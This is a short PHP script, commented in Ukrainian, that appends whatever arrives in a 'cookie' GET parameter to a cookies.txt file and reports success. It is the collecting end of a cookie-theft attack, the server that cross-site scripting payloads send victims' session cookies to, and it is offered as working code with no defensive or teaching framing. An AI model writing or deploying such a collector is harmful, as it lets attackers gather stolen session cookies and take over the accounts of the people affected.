<?php
// Відкриваємо файл cookies.txt для запису. Якщо файл не існує, він буде створений.
$file = fopen('cookies.txt', 'a');

// Перевірка, чи параметр cookie переданий через GET
if (isset($_GET['cookie'])) {
    // Записуємо кукі в файл
    fwrite($file, "Cookies: " . $_GET['cookie'] . "\n");
} else {
    // Якщо кукі не передані, записуємо повідомлення про відсутність кукі
    fwrite($file, "No cookies received.\n");
}

// Закриваємо файл після запису
fclose($file);

// Виводимо підтвердження
echo "Cookies saved successfully.";
?>
